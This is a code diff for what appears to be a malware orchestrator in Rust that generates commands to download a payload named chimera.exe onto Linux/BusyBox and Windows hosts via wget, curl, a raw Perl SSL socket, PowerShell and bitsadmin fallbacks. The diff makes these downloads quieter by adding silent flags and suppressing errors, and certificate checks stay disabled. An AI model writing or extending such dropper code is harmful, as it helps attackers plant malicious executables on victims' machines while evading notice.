@@ -502,23 +502,24 @@ impl Orchestrator {
     fn generate_download_command(tool: &str, url: &str) -> String {
         match tool {
             "wget" => {
-                // Using BusyBox compatible options
+                // Using BusyBox compatible options with quiet mode
                 format!(
-                    "wget --no-check-certificate {} -O {} 2>&1 && ls -l {}", 
+                    "wget -q --no-check-certificate {} -O {} && ls -l {}",
                     url, OUTPUT_PATH, OUTPUT_PATH
                 )
             },
             "curl" => {
+                // Silent mode, suppress progress and errors
                 format!(
-                    "curl -k -L -v {} -o {} 2>&1 && ls -l {}", 
+                    "curl -s -k -L {} -o {} && ls -l {}",
                     url, OUTPUT_PATH, OUTPUT_PATH
                 )
             },
             "perl" => {
                 let (host, path) = Self::generate_perl_url_parts(url);
                 format!(
-                    "perl -e 'use IO::Socket::SSL qw(SSL_VERIFY_NONE); $s=IO::Socket::SSL->new(PeerAddr=>\"{host}:443\", SSL_verify_mode => SSL_VERIFY_NONE) or die $!; print $s \"GET /{path} HTTP/1.0\\r\\nHost: {host}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"; while(<$s>){{last if /^\\r\\n$/}} while(read($s,$b,8192)){{print $b}}' > {output} 2>&1 && ls -l {output}", 
-                    host = host, 
+                    "perl -e 'use IO::Socket::SSL qw(SSL_VERIFY_NONE); $s=IO::Socket::SSL->new(PeerAddr=>\"{host}:443\", SSL_verify_mode => SSL_VERIFY_NONE) or die $!; print $s \"GET /{path} HTTP/1.0\\r\\nHost: {host}\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\"; while(<$s>){{last if /^\\r\\n$/}} while(read($s,$b,8192)){{print $b}}' > {output} 2>/dev/null && ls -l {output}",
+                    host = host,
                     path = path,
                     output = OUTPUT_PATH
                 )
@@ -643,7 +644,7 @@ impl Orchestrator {
        // Multi-method download with fallbacks for Vista through Windows 11
        // Method 1: curl (Win10 1803+), Method 2: PowerShell (Win7+), Method 3: bitsadmin (Vista+ - slowest, last resort)
        let download_cmd = format!(
-           "cmd.exe /c \"(curl.exe --version >nul 2>&1 && curl.exe -k -L -o C:\\Temp\\chimera.exe {url}) || (powershell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try {{ Invoke-WebRequest -Uri '{url}' -OutFile 'C:\\Temp\\chimera.exe' -UseBasicParsing }} catch {{ (New-Object System.Net.WebClient).DownloadFile('{url}', 'C:\\Temp\\chimera.exe') }}\") || (bitsadmin /transfer ChimeraDownload /download /priority FOREGROUND {url} C:\\Temp\\chimera.exe) && if exist C:\\Temp\\chimera.exe (echo SUCCESS: Downloaded && dir C:\\Temp\\chimera.exe) else (echo FAILED: File does not exist)\"",
+           "cmd.exe /c \"(curl.exe --version >nul 2>&1 && curl.exe -s -k -L -o C:\\Temp\\chimera.exe {url}) || (powershell -Command \"$ErrorActionPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try {{ Invoke-WebRequest -Uri '{url}' -OutFile 'C:\\Temp\\chimera.exe' -UseBasicParsing }} catch {{ (New-Object System.Net.WebClient).DownloadFile('{url}', 'C:\\Temp\\chimera.exe') }}\") || (bitsadmin /transfer ChimeraDownload /download /priority FOREGROUND {url} C:\\Temp\\chimera.exe >nul) && if exist C:\\Temp\\chimera.exe (echo SUCCESS: Downloaded && dir C:\\Temp\\chimera.exe) else (echo FAILED: File does not exist)\"",
            url = CHIMERA_URL_WIN
        );
 
